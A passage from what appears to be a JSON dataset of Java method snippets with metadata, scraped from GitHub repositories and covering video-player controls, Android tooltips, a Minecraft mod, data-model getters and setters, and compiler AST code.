<= MAX_POSITION_FOR_SEEK_TO_PREVIOUS                || (window.isDynamic && !window.isSeekable))) {            mInternalPlayer.seekTo(previousWindowIndex, C.TIME_UNSET);        } else {            mInternalPlayer.seekTo(0);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExo2MediaPlayer.java", "stars": "2", "class": {"name": "GSYExo2MediaPlayer", "extends": "IjkExo2MediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "next", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void next() {        if (mInternalPlayer == null) {            return;        }        Timeline timeline = mInternalPlayer.getCurrentTimeline();        if (timeline.isEmpty()) {            return;        }        int windowIndex = mInternalPlayer.getCurrentWindowIndex();        int nextWindowIndex = mInternalPlayer.getNextWindowIndex();        if (nextWindowIndex != C.INDEX_UNSET) {            mInternalPlayer.seekTo(nextWindowIndex, C.TIME_UNSET);        } else if (timeline.getWindow(windowIndex, window, false).isDynamic) {            mInternalPlayer.seekTo(windowIndex, C.TIME_UNSET);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExo2MediaPlayer.java", "stars": "2", "class": {"name": "GSYExo2MediaPlayer", "extends": "IjkExo2MediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurrentWindowIndex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCurrentWindowIndex() {        if (mInternalPlayer == null) {            return 0;        }        return  mInternalPlayer.getCurrentWindowIndex();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/exo/GSYExo2MediaPlayer.java", "stars": "2", "class": {"name": "GSYExo2MediaPlayer", "extends": "IjkExo2MediaPlayer", "implements": null, "modifiers": ["public"]}}, {"method_name": "eat", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void eat() {        System.out.println(\"\u4e00\u5929\u4e00\u82f9\u679c\uff0c\u533b\u751f\u8fdc\u79bb\u6211\");    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/cc1021/Lambda/Eatablempl.java", "stars": "2", "class": {"name": "Eatablempl", "extends": null, "implements": ["Eatable"], "modifiers": ["public"]}}, {"method_name": "getText", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LiveData<String>", "snippet": "    public LiveData<String> getText() {        return mText;    }", "url": "https://raw.githubusercontent.com/dahilu/BeautyOverview/master/app/src/main/java/com/example/beautyoverview/ui/slideshow/SlideshowViewModel.java", "stars": "1", "class": {"name": "SlideshowViewModel", "extends": "ViewModel", "implements": null, "modifiers": ["public"]}}, {"method_name": "setup", "params": ["View"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setup(View view) {        view.setOnLongClickListener(new View.OnLongClickListener() {            @Override            public boolean onLongClick(View view) {                return showCheatSheet(view, view.getContentDescription());            }        });    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/utils/CheatSheet.java", "stars": "4", "class": {"name": "CheatSheet", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setup", "params": ["View", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setup(View view, final int textResId) {        view.setOnLongClickListener(new View.OnLongClickListener() {            @Override            public boolean onLongClick(View view) {                return showCheatSheet(view, view.getContext().getString(textResId));            }        });    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/utils/CheatSheet.java", "stars": "4", "class": {"name": "CheatSheet", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setup", "params": ["View", "CharSequence"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void setup(View view, final CharSequence text) {        view.setOnLongClickListener(new View.OnLongClickListener() {            @Override            public boolean onLongClick(View view) {                return showCheatSheet(view, text);            }        });    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/utils/CheatSheet.java", "stars": "4", "class": {"name": "CheatSheet", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "remove", "params": ["View"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void remove(final View view) {        view.setOnLongClickListener(null);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/utils/CheatSheet.java", "stars": "4", "class": {"name": "CheatSheet", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "showCheatSheet", "params": ["View", "CharSequence"], "throws": null, "modifiers": ["private", "static"], "return_type": "boolean", "snippet": "    private static boolean showCheatSheet(View view, CharSequence text) {        if (TextUtils.isEmpty(text)) {            return false;        }        final int[] screenPos = new int[2]; // origin is device display        final Rect displayFrame = new Rect(); // includes decorations (e.g. status bar)        view.getLocationOnScreen(screenPos);        view.getWindowVisibleDisplayFrame(displayFrame);        final Context context = view.getContext();        final int viewWidth = view.getWidth();        final int viewHeight = view.getHeight();        final int viewCenterX = screenPos[0] + viewWidth / 2;        final int screenWidth = context.getResources().getDisplayMetrics().widthPixels;        final int estimatedToastHeight = (int) (ESTIMATED_TOAST_HEIGHT_DIPS                * context.getResources().getDisplayMetrics().density);        Toast cheatSheet = Toast.makeText(context, text, Toast.LENGTH_SHORT);        boolean showBelow = screenPos[1] < estimatedToastHeight;        if (showBelow) {            // Show below            // Offsets are after decorations (e.g. status bar) are factored in            cheatSheet.setGravity(Gravity.TOP | Gravity.CENTER_HORIZONTAL,                    viewCenterX - screenWidth / 2,                    screenPos[1] - displayFrame.top + viewHeight);        } else {            // Show above            // Offsets are after decorations (e.g. status bar) are factored in            // NOTE: We can't use Gravity.BOTTOM because when the keyboard is up            // its height isn't factored in.            cheatSheet.setGravity(Gravity.TOP | Gravity.CENTER_HORIZONTAL,                    viewCenterX - screenWidth / 2,                    screenPos[1] - displayFrame.top - estimatedToastHeight);        }        cheatSheet.show();        return true;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/utils/CheatSheet.java", "stars": "4", "class": {"name": "CheatSheet", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "executeProcedure", "params": ["java"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void executeProcedure(java.util.HashMap<String, Object> dependencies) {\t\tif (dependencies.get(\"x\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency x for procedure OrangeAmaranthPlayer!\");\t\t\treturn;\t\t}\t\tif (dependencies.get(\"y\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency y for procedure OrangeAmaranthPlayer!\");\t\t\treturn;\t\t}\t\tif (dependencies.get(\"z\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency z for procedure OrangeAmaranthPlayer!\");\t\t\treturn;\t\t}\t\tif (dependencies.get(\"world\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency world for procedure OrangeAmaranthPlayer!\");\t\t\treturn;\t\t}\t\tint x = (int) dependencies.get(\"x\");\t\tint y = (int) dependencies.get(\"y\");\t\tint z = (int) dependencies.get(\"z\");\t\tWorld world = (World) dependencies.get(\"world\");\t\tif (!world.isRemote) {\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(OrangeAmaranthBlock.block, (int) (1)));\t\t\tentityToSpawn.setPickupDelay(10);\t\t\tworld.addEntity(entityToSpawn);\t\t}\t\tif (!world.isRemote) {\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(Items.FLOWER_POT, (int) (1)));\t\t\tentityToSpawn.setPickupDelay(10);\t\t\tworld.addEntity(entityToSpawn);\t\t}\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/procedures/OrangeAmaranthPlayerProcedure.java", "stars": "2", "class": {"name": "OrangeAmaranthPlayerProcedure", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "getCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCode() {        return code;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/JoinChannelResult.java", "stars": "1", "class": {"name": "JoinChannelResult", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setCode", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCode(int code) {        this.code = code;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/JoinChannelResult.java", "stars": "1", "class": {"name": "JoinChannelResult", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getMsg", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMsg() {        return msg;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/JoinChannelResult.java", "stars": "1", "class": {"name": "JoinChannelResult", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setMsg", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMsg(String msg) {        this.msg = msg;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/JoinChannelResult.java", "stars": "1", "class": {"name": "JoinChannelResult", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Token", "snippet": "    public Token getData() {        return data;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/JoinChannelResult.java", "stars": "1", "class": {"name": "JoinChannelResult", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setData", "params": ["Token"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setData(Token data) {        this.data = data;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/JoinChannelResult.java", "stars": "1", "class": {"name": "JoinChannelResult", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {        return \"JoinChannelResult{\" +                \"code=\" + code +                \", msg='\" + msg + '\\'' +                \", data=\" + data +                '}';    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/JoinChannelResult.java", "stars": "1", "class": {"name": "JoinChannelResult", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getToken", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getToken() {            return token;        }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/JoinChannelResult.java", "stars": "1", "class": {"name": "Token", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setToken", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setToken(String token) {            this.token = token;        }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/JoinChannelResult.java", "stars": "1", "class": {"name": "Token", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String toString() {            return \"Token{\" +                    \"token='\" + token + '\\'' +                    '}';        }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/JoinChannelResult.java", "stars": "1", "class": {"name": "Token", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        /*            File\u7c7b\u7684\u6784\u9020\u65b9\u6cd5         */        //show02(\"c:\\\\\",\"a.txt\");//c:\\a.txt        //show02(\"d:\\\\\",\"a.txt\");//d:\\a.txt        show03();        File f = new File(\"C:\\\\Users\\\\itcast\\\\IdeaProjects\\\\shungyuan\");        long length = f.length();        System.out.println(length);    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/19.%E3%80%90File%E7%B1%BB%E3%80%81%E9%80%92%E5%BD%92%E3%80%91-%E7%AC%94%E8%AE%B0/code/08_FileAndRecursion/src/com/itheima/demo01/File/Demo02File(1).java", "stars": "2", "class": {"name": "Demo02File", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "show03", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void show03() {        File parent = new File(\"c:\\\\\");        File file = new File(parent,\"hello.java\");        System.out.println(file);//c:\\hello.java    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/19.%E3%80%90File%E7%B1%BB%E3%80%81%E9%80%92%E5%BD%92%E3%80%91-%E7%AC%94%E8%AE%B0/code/08_FileAndRecursion/src/com/itheima/demo01/File/Demo02File(1).java", "stars": "2", "class": {"name": "Demo02File", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "show02", "params": ["String", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void show02(String parent, String child) {        File file = new File(parent,child);        System.out.println(file);//c:\\a.txt    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/19.%E3%80%90File%E7%B1%BB%E3%80%81%E9%80%92%E5%BD%92%E3%80%91-%E7%AC%94%E8%AE%B0/code/08_FileAndRecursion/src/com/itheima/demo01/File/Demo02File(1).java", "stars": "2", "class": {"name": "Demo02File", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "show01", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void show01() {        File f1 = new File(\"C:\\\\Users\\\\itcast\\\\IdeaProjects\\\\shungyuan\\\\a.txt\");        System.out.println(f1);//\u91cd\u5199\u4e86Object\u7c7b\u7684toString\u65b9\u6cd5 C:\\Users\\itcast\\IdeaProjects\\shungyuan\\a.txt        File f2 = new File(\"C:\\\\Users\\\\itcast\\\\IdeaProjects\\\\shungyuan\");        System.out.println(f2);//C:\\Users\\itcast\\IdeaProjects\\shungyuan        File f3 = new File(\"b.txt\");        System.out.println(f3);//b.txt    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/19.%E3%80%90File%E7%B1%BB%E3%80%81%E9%80%92%E5%BD%92%E3%80%91-%E7%AC%94%E8%AE%B0/code/08_FileAndRecursion/src/com/itheima/demo01/File/Demo02File(1).java", "stars": "2", "class": {"name": "Demo02File", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "afterSendCompletion", "params": ["Message<?>", "MessageChannel", "boolean", "Exception"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void afterSendCompletion(Message<?> message, MessageChannel channel, boolean sent, Exception ex) {        StompHeaderAccessor accessor = StompHeaderAccessor.wrap(message);        StompCommand command = accessor.getCommand();        Principal principal = accessor.getUser();        if (principal == null || principal.getName() == null) {            return;        }        String username = principal.getName();        if (StompCommand.CONNECT.equals(command)) {            onlineUserService.addNewUserCache(new UserBo(username, accessor.getSessionId()));        } else if (StompCommand.SUBSCRIBE.equals(command)) {            String destination = accessor.getDestination();            onlineUserService.subscribeInUserCache(username, destination);        } else if (StompCommand.DISCONNECT.equals(command)) {            gameService.removeUser(username);        } else if (!StompCommand.SEND.equals(command)) {            //send\u7c7b\u578b\u5728controller\u91cc\u9762\u5355\u72ec\u5904\u7406            log.info(\"user:{} send nonsupport command:{}\", username, command);        }    }", "url": "https://raw.githubusercontent.com/jiangvin/webtank/master/websocket/src/main/java/com/integration/socket/interceptor/MessageInterceptor.java", "stars": "2", "class": {"name": "MessageInterceptor", "extends": null, "implements": ["ChannelInterceptor"], "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getId() {    return id;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_proxyfactory_comparison/UserWithGetXxxWithoutInterface.java", "stars": "15", "class": {"name": "UserWithGetXxxWithoutInterface", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setId", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setId(Integer id) {    this.id = id;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_proxyfactory_comparison/UserWithGetXxxWithoutInterface.java", "stars": "15", "class": {"name": "UserWithGetXxxWithoutInterface", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getName() {    return name;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_proxyfactory_comparison/UserWithGetXxxWithoutInterface.java", "stars": "15", "class": {"name": "UserWithGetXxxWithoutInterface", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setName(String name) {    this.name = name;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_proxyfactory_comparison/UserWithGetXxxWithoutInterface.java", "stars": "15", "class": {"name": "UserWithGetXxxWithoutInterface", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOwner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Group", "snippet": "  public Group getOwner() {    return owner;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_proxyfactory_comparison/UserWithGetXxxWithoutInterface.java", "stars": "15", "class": {"name": "UserWithGetXxxWithoutInterface", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setOwner", "params": ["Group"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setOwner(Group owner) {    this.owner = owner;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/lazyload_proxyfactory_comparison/UserWithGetXxxWithoutInterface.java", "stars": "15", "class": {"name": "UserWithGetXxxWithoutInterface", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "checkType", "params": [], "throws": ["TypeException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void checkType() throws TypeException {\t\tthis.getLeft().checkType();\t\tthis.getRight().checkType();\t\tTypeCode[] typeCodes = {TypeCode.INTEGER, TypeCode.FLOAT};\t\tgetLeft().getType().assertType(this, typeCodes);\t\tgetLeft().getType().assertType(this, getRight().getType());\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprLT.java", "stars": "3", "class": {"name": "ExprLT", "extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"method_name": "generateCode", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String generateCode() throws CodeException {\t\tString result = \"\";\t\tresult = \"(\" + getLeft().generateCode()\t\t\t\t+ \" < \" + getRight().generateCode() + \")\";\t\treturn result;\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprLT.java", "stars": "3", "class": {"name": "ExprLT", "extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"method_name": "constEval", "params": ["Environment<ExprVALUE>"], "throws": ["EnvironmentException", "TypeException"], "modifiers": ["public"], "return_type": "Object", "snippet": "\tpublic Object constEval(Environment<ExprVALUE> environment) throws EnvironmentException, TypeException {\t\tObject o1 = getLeft().constEval(environment);\t\tObject o2 = getRight().constEval(environment);\t\tif ((o1 instanceof Integer) && (o2 instanceof Integer)) \t\t\treturn new Boolean((Integer)o1 < (Integer)o2);\t\telse if ((o1 instanceof Float) && (o2 instanceof Float)) \t\t\treturn new Boolean((Float)o1 < (Float)o2);\t\telse\t\t\tthrow new TypeException(\"Impossible de calculer la constante, erreur de type\", line, column);\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprLT.java", "stars": "3", "class": {"name": "ExprLT", "extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\t\treturn \"(\" + this.getLeft() + \" < \" + this.getRight() + \")\";\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprLT.java", "stars": "3", "class": {"name": "ExprLT", "extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"method_name": "registerCommunication", "params": ["List<Configuration>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void registerCommunication(List<Configuration> configurationList) {        super.getCollector().registerTaskCommunication(configurationList);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/taskgroup/AbstractTGContainerCommunicator.java", "stars": "23", "class": {"name": "AbstractTGContainerCommunicator", "extends": "AbstractContainerCommunicator", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "collect", "params": [], "throws": null, "modifiers": ["public", "final"], "return_type": "Communication", "snippet": "    public final Communication collect() {        return this.getCollector().collectFromTask();    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/taskgroup/AbstractTGContainerCommunicator.java", "stars": "23", "class": {"name": "AbstractTGContainerCommunicator", "extends": "AbstractContainerCommunicator", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "collectState", "params": [], "throws": null, "modifiers": ["public", "final"], "return_type": "State", "snippet": "    public final State collectState() {        Communication communication = new Communication();        communication.setState(State.SUCCEEDED);        for (Communication taskCommunication :                super.getCollector().getTaskCommunicationMap().values()) {            communication.mergeStateFrom(taskCommunication);        }        return communication.getState();    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/taskgroup/AbstractTGContainerCommunicator.java", "stars": "23", "class": {"name": "AbstractTGContainerCommunicator", "extends": "AbstractContainerCommunicator", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getCommunication", "params": ["Integer"], "throws": null, "modifiers": ["public", "final"], "return_type": "Communication", "snippet": "    public final Communication getCommunication(Integer taskId) {        Validate.isTrue(taskId >= 0, \"\u6ce8\u518c\u7684taskId\u4e0d\u80fd\u5c0f\u4e8e0\");        return super.getCollector().getTaskCommunication(taskId);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/taskgroup/AbstractTGContainerCommunicator.java", "stars": "23", "class": {"name": "AbstractTGContainerCommunicator", "extends": "AbstractContainerCommunicator", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getCommunicationMap", "params": [], "throws": null, "modifiers": ["public", "final"], "return_type": "Map<Integer,Communication>", "snippet": "    public final Map<Integer, Communication> getCommunicationMap() {        return super.getCollector().getTaskCommunicationMap();    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/statistics/container/communicator/taskgroup/AbstractTGContainerCommunicator.java", "stars": "23", "class": {"name": "AbstractTGContainerCommunicator", "extends": "AbstractContainerCommunicator", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getBiome", "params": ["BlockRenderView", "BlockPos"], "throws": null, "modifiers": ["public", "static"], "return_type": "Biome", "snippet": "\tpublic static Biome getBiome(BlockRenderView view, BlockPos pos) {\t\tCursedBiomeThing cursed = POOL.get();\t\tview.getColor(pos, cursed);\t\tBiome result = cursed.result;\t\tSystem.out.println(\"Cursed biome for \" + pos + \" is \" + result);\t\tPOOL.readd(cursed);\t\treturn result;\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/util/CursedBiomeThing.java", "stars": "3", "class": {"name": "CursedBiomeThing", "extends": null, "implements": ["ColorResolver"], "modifiers": ["public"]}}, {"method_name": "getColor", "params": ["Biome", "double", "double"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getColor(Biome biome, double d, double e) {\t\tresult = biome;\t\treturn 0;\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/util/CursedBiomeThing.java", "stars": "3", "class": {"name": "CursedBiomeThing", "extends": null, "implements": ["ColorResolver"], "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "\tpublic Long getId() {\t\treturn id;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setId", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setId(Long id) {\t\tthis.id = id;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDataCriacao", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\tpublic Date getDataCriacao() {\t\treturn dataCriacao;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDataCriacao", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDataCriacao(Date dataCriacao) {\t\tthis.dataCriacao = dataCriacao;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getObservacao", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getObservacao() {\t\treturn observacao;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setObservacao", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setObservacao(String observacao) {\t\tthis.observacao = observacao;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getValorFrete", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "\tpublic Double getValorFrete() {\t\treturn valorFrete;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setValorFrete", "params": ["Double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setValorFrete(Double valorFrete) {\t\tthis.valorFrete = valorFrete;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getValorTotal", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "\tpublic Double getValorTotal() {\t\treturn valorTotal;\t}", "url": "https://raw.githubusercontent.com/emanoel2712/MeusPedidos/master/src/main/java/br/senac/sc/meuspedidos/model/Pedido.java", "stars": "1", "class": {"name": "Pedido", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setValorTotal", "params": ["Double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setValorTotal(Double valorTotal) {\t\tthis.valorTotal = valorTotal;\t}", "url": 